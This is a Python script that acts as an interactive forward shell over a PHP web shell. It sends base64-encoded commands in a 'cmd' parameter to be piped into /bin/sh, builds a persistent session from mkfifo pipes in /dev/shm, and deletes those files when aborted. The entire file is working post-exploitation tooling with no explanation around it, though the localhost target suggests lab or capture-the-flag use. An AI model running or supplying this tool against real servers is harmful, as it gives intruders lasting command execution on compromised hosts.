#!/usr/bin/env python3

import requests
import signal
import sys

from termcolor import colored
from base64 import b64encode
from random import randrange

def def_handler(sig, frame):
    print(colored(f"\n\n[!] Aborting...\n", 'red'))
    remove_data()
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

session = randrange(1000, 9999)
main_url = "http://localhost/index.php"
stdin = f"/dev/shm/{session}.input"
stdout = f"/dev/shm/{session}.output"

def run_command(command):

    command = b64encode(command.encode()).decode()

    data = {
            'cmd': 'echo "%s" | base64 -d | /bin/sh' % command
            }
    try:
        r = requests.get(main_url, params=data, timeout=5)
        return r.text
    except:
        #        print("\nSomething failed")
        pass
    
    return None

def write_stdin(command):
    command = b64encode(command.encode()).decode()

    data = {
            'cmd': 'echo "%s" | base64 -d > %s' % (command, stdin)
            }

    r = requests.get(main_url, params=data)

def read_stdout():
    read_stdout_command = f"/bin/cat {stdout}"
    output_command = run_command(read_stdout_command)

    return output_command

def setup_shell():
    command = f"mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s" % (stdin, stdin, stdout)
    run_command(command)

def remove_data():
    remove_data_command = f"/bin/rm {stdin} {stdout}"
    run_command(remove_data_command)

def clear_stdout():
    clear_stdout_command = f"echo '' > {stdout}"
    run_command(clear_stdout_command)

if __name__ == "__main__":
    setup_shell()

    while True:
        command = input(colored(">> ", 'yellow'))
        write_stdin(command + "\n")
        output_command = read_stdout()
        print(output_command)
        clear_stdout()
